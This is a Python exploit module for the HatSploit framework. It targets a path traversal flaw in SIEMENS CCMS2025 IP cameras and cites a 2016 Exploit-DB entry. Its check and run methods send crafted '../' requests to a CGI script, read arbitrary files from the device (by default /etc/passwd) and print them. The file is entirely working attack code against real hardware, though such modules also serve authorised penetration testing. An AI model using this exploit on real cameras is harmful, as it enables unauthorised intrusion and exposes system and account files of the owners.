"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "SIEMENS CCMS2025 Path Traversal",
            'Module': "exploit/linux/siemens/ccms2025_path_traversal",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Yakir Wizman - vulnerability researcher"
            ],
            'Description': (
                "SIEMENS IP-Camera CCMS2025(-IR) has a vulnerability exploitation of "
                "which leading to a path traversal."
            ),
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Devices': [
                "SIEMENS IP-Camera CVMS2025-IR - firmware x.2.2.1798, CxMS2025_V2458_SP1, x.2.2.1798, x.2.2.1235",
                "SIEMENS IP-Camera CCMS2025 - firmware x.2.2.1798, CxMS2025_V2458_SP1, x.2.2.1798, x.2.2.1235"
            ],
            'References': [
                {'URL': 'https://www.exploit-db.com/exploits/40254'},
                {'EDB': 40254}
            ],
            'DisclosureDate': "2016-08-17",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

        self.file = Option('FILE', "/etc/passwd", "File to read.", True)

    def check(self):
        response = self.http_request(
            method="GET",
            path=f'/cgi-bin/check.cgi?file=../../..//etc/passwd',
        )

        if response and response.status_code == 200:
            return True

        return False

    def run(self):
        response = self.http_request(
            method="GET",
            path=f'/cgi-bin/check.cgi?file=../../../{self.file.value}',
        )

        if response.text:
            self.print_empty(f"\n{response.text}")
        else:
            self.print_warning("File is empty.")
